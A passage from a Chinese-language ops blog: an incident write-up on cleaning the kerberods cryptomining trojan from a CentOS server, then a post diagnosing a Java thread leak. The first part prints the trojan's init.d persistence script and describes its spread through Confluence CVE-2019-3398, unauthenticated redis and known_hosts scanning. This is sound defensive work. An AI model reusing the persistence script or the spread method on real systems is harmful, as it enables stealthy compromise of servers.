class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_3_114_centos init.d]<span class="comment"># cat /etc/init.d/netdns </span></span><br><span class="line"><span class="comment">#! /bin/bash</span></span><br><span class="line"><span class="comment">#chkconfig: - 99 01</span></span><br><span class="line"><span class="comment">#description: kerberods daemon</span></span><br><span class="line"><span class="comment">#processname: /usr/sbin/kerberods</span></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment"># Provides:     /user/sbin/kerberods</span></span><br><span class="line"><span class="comment"># Required-Start:</span></span><br><span class="line"><span class="comment"># Required-Stop:</span></span><br><span class="line"><span class="comment"># Default-Start:        2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop:         0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: kerberods deamon</span></span><br><span class="line"><span class="comment"># Description:          kerberods deamon</span></span><br><span class="line"><span class="comment">### END INIT INFO</span></span><br><span class="line">LocalPath=<span class="string">&quot;/usr/sbin/kerberods&quot;</span></span><br><span class="line">name=<span class="string">&#x27;kerberods&#x27;</span></span><br><span class="line">pid_file=<span class="string">&quot;/tmp/.X11unix&quot;</span></span><br><span class="line">stdout_log=<span class="string">&quot;/var/log/<span class="variable">$name</span>.log&quot;</span></span><br><span class="line">stderr_log=<span class="string">&quot;/var/log/<span class="variable">$name</span>.err&quot;</span></span><br><span class="line"><span class="function"><span class="title">get_pid</span></span>()&#123;</span><br><span class="line">    <span class="built_in">cat</span> <span class="string">&quot;<span class="variable">$pid_file</span>&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="title">is_running</span></span>()&#123;</span><br><span class="line">    [ -f <span class="string">&quot;<span class="variable">$pid_file</span>&quot;</span> ] &amp;&amp;/usr/sbin/kerberods -Pid $(get_pid) &gt; /dev/null 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">start)</span><br><span class="line">    <span class="keyword">if</span> is_running; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Already started&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Starting <span class="variable">$name</span>&quot;</span></span><br><span class="line">        <span class="variable">$LocalPath</span> &gt;&gt;<span class="string">&quot;<span class="variable">$stdout_log</span>&quot;</span> 2&gt;&gt; <span class="string">&quot;<span class="variable">$stderr_log</span>&quot;</span> &amp;</span><br><span class="line">        <span class="built_in">echo</span> $! &gt; <span class="string">&quot;<span class="variable">$pid_file</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> ! is_running; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Unable to start, see<span class="variable">$stdout_log</span> and <span class="variable">$stderr_log</span>&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">;;</span><br><span class="line">stop)</span><br><span class="line">    <span class="keyword">if</span> is_running; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">&quot;Stopping<span class="variable">$name</span>..&quot;</span></span><br><span class="line">        <span class="built_in">kill</span> $(get_pid)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..10&#125;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">            <span class="keyword">if</span> ! is_running; <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">break</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">            <span class="built_in">echo</span> -n <span class="string">&quot;.&quot;</span></span><br><span class="line">            <span class="built_in">sleep</span> 1</span><br><span class="line">        <span class="keyword">done</span></span><br><span class="line">        <span class="built_in">echo</span></span><br><span class="line">        <span class="keyword">if</span> is_running; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Not stopped; maystill be shutting down or shutdown may have failed&quot;</span></span><br><span class="line">            <span class="built_in">exit</span> 1</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;Stopped&quot;</span></span><br><span class="line">            <span class="keyword">if</span> [ -f <span class="string">&quot;<span class="variable">$pid_file</span>&quot;</span>]; <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">rm</span> <span class="string">&quot;<span class="variable">$pid_file</span>&quot;</span></span><br><span class="line">            <span class="keyword">fi</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Not running&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">;;</span><br><span class="line">restart)</span><br><span class="line">    <span class="variable">$0</span> stop</span><br><span class="line">    <span class="keyword">if</span> is_running; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Unable to stop, will notattempt to start&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">    <span class="variable">$0</span> start</span><br><span class="line">;;</span><br><span class="line">status)</span><br><span class="line">    <span class="keyword">if</span> is_running; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Running&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Stopped&quot;</span></span><br><span class="line">        <span class="built_in">exit</span> 1</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$0</span>&#123;start|stop|restart|status&#125;&quot;</span></span><br><span class="line"><span class="built_in">exit</span> 1</span><br><span class="line">;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>kerberods木马二进程文件 &#x2F;usr&#x2F;sbin&#x2F;kerberods，需要upx脱壳，具体的可以参考<a target="_blank" rel="noopener" href="https://laucyun.com/17e194c26e4554cab975aae760bad553.html">https://laucyun.com/17e194c26e4554cab975aae760bad553.html</a></li>
</ul>
<p><strong>最后汇总下杀毒步骤及注意事项</strong> - 删除木马及启动服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /usr/sbin/kerberods</span><br><span class="line">rm -rf /etc/init.d/netdns</span><br><span class="line">rm -rf /etc/rc.d/rc0.d/K01netdns</span><br><span class="line">rm -rf /etc/rc.d/rc1.d/K01netdns</span><br><span class="line">rm -rf /etc/rc.d/rc2.d/S99netdns</span><br><span class="line">rm -rf /etc/rc.d/rc3.d/S99netdns</span><br><span class="line">rm -rf /etc/rc.d/rc4.d/S99netdns</span><br><span class="line">rm -rf /etc/rc.d/rc5.d/S99netdns</span><br><span class="line">rm -rf /etc/rc.d/rc6.d/K01netdns</span><br><span class="line">rm -rf /etc/systemd/system/multi-user.target.wants/netdns.service</span><br><span class="line">rm -rf /usr/lib/systemd/system/netdns.servic</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>删除计划任务</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /etc/crond.d/tomcat</span><br><span class="line">&gt; /var/spool/cron/root ;chattr +i root </span><br><span class="line">&gt; /var/spool/cron/crontabs/root ;chattr +i root </span><br><span class="line">&gt; /etc/cron.d/root ;chattr +i root </span><br></pre></td></tr></table></figure>

<ul>
<li><p>redis清空相关配置及设置密钥，不要用root账号运行redis</p>
</li>
<li><p>修改hosts文件设置pastebin.com解析</p>
</li>
<li><p>重启（如果不重启，有些进制驻留到内存不能释放）</p>
</li>
<li><p>htop，top等命令还是显示不了多核心，可以重新部署系统</p>
</li>
<li><p>检查&#x2F;root&#x2F;.ssh&#x2F;known_hosts里面服务器是否也有相关问题</p>
</li>
<li><p>做好安全组云服务虽然有VPC隔离但是并不安全，如果不限制好安全组其他中毒的服务器容易攻击</p>
</li>
</ul>
<p><strong>事后发现最终原因</strong></p>
<blockquote>
<p>情报名称<br>Confluence 路径穿越漏洞安全预警（CVE-2019-3398） 风险等级<br>严重 情报概述<br>近日，腾讯云安全中心监测到 Confluence官方发布安全公告，披露了Confluence Server 和 Data Center 产品在 downloadallattachments 资源中存在的一个路径穿越漏洞，攻击者可利用该漏洞写入恶意文件导致代码执行。 为避免您的业务受影响，腾讯云安全中心建议您及时开展安全自查，如在受影响范围，请您及时进行更新修复，避免被外部攻击者入侵</p>
</blockquote>
<p><strong>逆向工程</strong> Confluence网站80端口对公网开放，黑客利用漏洞入侵，下载病毒到Confluence服务器，然后病毒根据.ssh&#x2F;known_hosts文件扫描服务器及所在网段redis服务，如果redis服务为授权就会有如上redis服务哪一堆骚操作了，会通过redis把下载并执行病毒的操作写入计划任务里。最后就算内网没有redis服务也会尝试暴力破解的方式攻击内网服务器，所以内网弱密码同样是重灾区。云服务器的安全很重要，要不然病毒会在整个云环境中蔓延。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://minminmsn.github.io/2019/04/09/2019/04/2019-04-09-java%E7%BA%BF%E7%A8%8B%E6%B3%84%E9%9C%B2%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/index/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Jerry Min">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="MinMinMsn">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/09/2019/04/2019-04-09-java%E7%BA%BF%E7%A8%8B%E6%B3%84%E9%9C%B2%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/index/" class="post-title-link" itemprop="url">Java线程泄露问题分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2019-04-09 08:00:00" itemprop="dateCreated datePublished" datetime="2019-04-09T08:00:00+08:00">2019-04-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-05-26 15:06:31" itemprop="dateModified" datetime="2023-05-26T15:06:31+08:00">2023-05-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/middleware/" itemprop="url" rel="index"><span itemprop="name">middleware</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>现象</strong> 开发反馈登陆不了服务器了，默认开发是work账号登陆，root账号还没受影响。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_101_65_centos ~]# su - work</span><br><span class="line">Last login: Mon Apr  8 10:20:16 CST 2019 from 10.2.8.60 on pts/11</span><br><span class="line">su: failed to execute /bin/bash: Resource temporarily unavailable</span><br></pre></td></tr></table></figure>

<p><strong>分析</strong> 1.网上分析了下，大都说是和打开文件数与打开进程数有关，其实默认都做过优化的，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_101_65_centos ~]# ulimit -a</span><br><span class="line">core file size          (blocks, -c) 0</span><br><span class="line">data seg size           (kbytes, -d) unlimited</span><br><span class="line">scheduling priority             (-e) 0</span><br><span class="line">file size               (blocks, -f) unlimited</span><br><span class="line">pending signals                 (-i) 31216</span><br><span class="line">max locked memory       (kbytes, -l) 64</span><br><span class="line">max memory size         (kbytes, -m) unlimited</span><br><span class="line">open files                      (-n) 100001</span><br><span class="line">pipe size            (512 bytes, -p) 8</span><br><span class="line">POSIX message queues     (bytes, -q) 819200</span><br><span class="line">real-time priority              (-r) 0</span><br><span class="line">stack size              (kbytes, -s) 8192</span><br><span class="line">cpu time               (seconds, -t) unlimited</span><br><span class="line">max user processes              (-u) 31216</span><br><span class="line">virtual memory          (kbytes, -v) unlimited</span><br><span class="line">file locks                      (-x) unlimited</span><br></pre></td></tr></table></figure>

<p>2.分析可能是程序本身的原因，内存泄露，线程不释放等，前期观察cpu，内存使用率都不高，多半和线程有关，特别是java程序线程递增的问题比较普遍</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">top - 11:05:19 up 29 min,  5 users,  load average: 0.00, 0.02, 0.05</span><br><span class="line">Tasks: 111 total,   2 running, 109 sleeping,   0 stopped,   0 zombie</span><br><span class="line">%Cpu(s):  0.2 us,  0.3 sy,  0.0 ni, 99.3 id,  0.2 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">KiB Mem :  8010308 total,  5559104 free,  1809964 used,   641240 buff/cache</span><br><span class="line">KiB Swap:        0 total,        0 free,        0 used.  5937736 avail Mem </span><br><span class="line"></span><br><span class="line">  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                                             </span><br><span class="line">10924 work      20   0 5066300 975784  23676 S   1.3 12.2   1:54.09 java                                                </span><br><span class="line">11120 work      20   0 4202736 577132  19704 S   0.0  7.2   1:10.61 java                                                </span><br><span class="line">11357 work      20   0   95996  29560   1184 S   0.0  0.4   0:00.83 nginx                                               </span><br><span class="line">11359 work      20   0   95936  29560   1232 S   0.0  0.4   0:00.88 nginx                                               </span><br><span class="line">11358 work      20   0   95728  29292   1156 S   0.0  0.4   0:00.77 nginx                                               </span><br><span class="line">11360 work      20   0   95964  29284   1152 S   0.7  0.4   0:01.04 nginx      </span><br></pre></td></tr></table></figure>

<p>3.通过top或者ps可以查进程的线程信息，发现线程一直在递增，默认达到3万多的限制只是时间的问题了，后面就交给研发处理了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_101_65_centos ~]# top -H -p 10924</span><br><span class="line">top - 10:50:22 up 14 min,  5 users,  load average: 0.13, 0.12, 0.13</span><br><span class="line">Threads: 120 total,   0 running, 120 sleeping,   0 stopped,   0 zombie</span><br><span class="line">%Cpu(s):  1.0 us,  0.1 sy,  0.0 ni, 98.8 id,  0.0 wa,  0.0 hi,  0.1 si,  0.0 st</span><br><span class="line">KiB Mem :  8010308 total,  5682612 free,  1722432 used,   605264 buff/cache</span><br><span class="line">KiB Swap:        0 total,        0 free,        0 used.  6032076 avail Mem </span><br><span class="line"></span><br><span class="line">  PID USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                                              </span><br><span class="line">10940 work      20   0 4979964 930064  23660 S  1.0 11.6   0:08.97 java                                                 </span><br><span class="line">10927 work      20   0 4979964 930064  23660 S  0.3 11.6   0:17.75 java                                                 </span><br><span class="line">10933 work      20   0 4979964 930064  23660 S  0.3 11.6   0:00.67 java                                                 </span><br><span class="line">11017 work      20   0 4979964 930064  23660 S  0.3 11.6   0:00.11 java                                                 </span><br><span class="line">11025 work      20   0 4979964 930064  23660 S  0.3 11.6   0:00.09 java                                                 </span><br><span class="line">11202 work      20   0 4979964 930064  23660 S  0.3 11.6   0:00.03 java                                                 </span><br><span class="line">10924 work      20   0 4979964 930064  23660 S  0.0 11.6   0:00.00 java                                                 </span><br><span class="line">10928 work      20   0 4979964 930064  23660 S  0.0 11.6   0:00.36 java                                                 </span><br><span class="line">10929 work      20   0 4979964 930064  23660 S  0.0 11.6   0:00.39 java                                                 </span><br><span class="line">10930 work      20   0 4979964 930064  23660 S  0.0 11.6   0:00.35 java                                                 </span><br><span class="line">10931 work      20   0 4979964 930064  23660 S  0.0 11.6   0:00.34 java                                                 </span><br><span class="line">10932 work      20   0 4979964 930064  23660 S  0.0 11.6   0:02.64 java                                                 </span><br><span class="line">10934 work      20   0 4979964 930064  23660 S  0.0 11.6   0:00.01 java                                                 </span><br><span class="line">10935 work      20   0 4979964 930064  23660 S  0.0 11.6   0:00.01 java                                                 </span><br><span class="line">10936 work      20   0 4979964 930064  23660 S  0.0 11.6   0:00.00 java                                                 </span><br><span class="line">10937 work      20   0 4979964 930064  23660 S  0.0 11.6   0:00.00 java                                                 </span><br><span class="line">10938 work      20   0 4979964 930064  23660 S  0.0 11.6   0:25.85 java                                                 </span><br><span class="line">10939 work      20   0 4979964 930064  23660 S  0.0 11.6   0:28.59 java                                                 </span><br><span class="line">10941 work      20   0 4979964 930064  23660 S  0.0 11.6   0:00.00 java                                                 </span><br><span class="line">10942 work      20   0 4979964 930064  23660 S  0.0 11.6   0:00.42 java                                                 </span><br><span class="line">10992 work      20   0 4979964 930064  23660 S  0.0 11.6   0:00.00 java                                                 </span><br><span class="line">11000 work      20   0 4979964 930064  23660 S  0.0 11.6   0:00.01 java                                                 </span><br><span class="line">11008 work      20   0 4979964 930064  23660 S  0.0 11.6   0:00.00 java                                                 </span><br><span class="line">[root@VM_101_65_centos ~]# ps huH 10924|wc -l</span><br><span class="line">120</span><br><span class="line">[root@VM_101_65_centos ~]# ps huH 10924|wc -l</span><br><span class="line">130</span><br><span class="line">[root@VM_101_65_centos ~]# ps huH 10924|wc -l</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/16/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/16/">16</a><span class="page-number current">17</span><a class="page-number" href="/page/18/">18</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><a class="extend next" rel="next" href="/page/18/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Jerry Min</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">260</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">34</span>
        <span class="site-state-item-name">categories</span>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">61</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Jerry Min</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
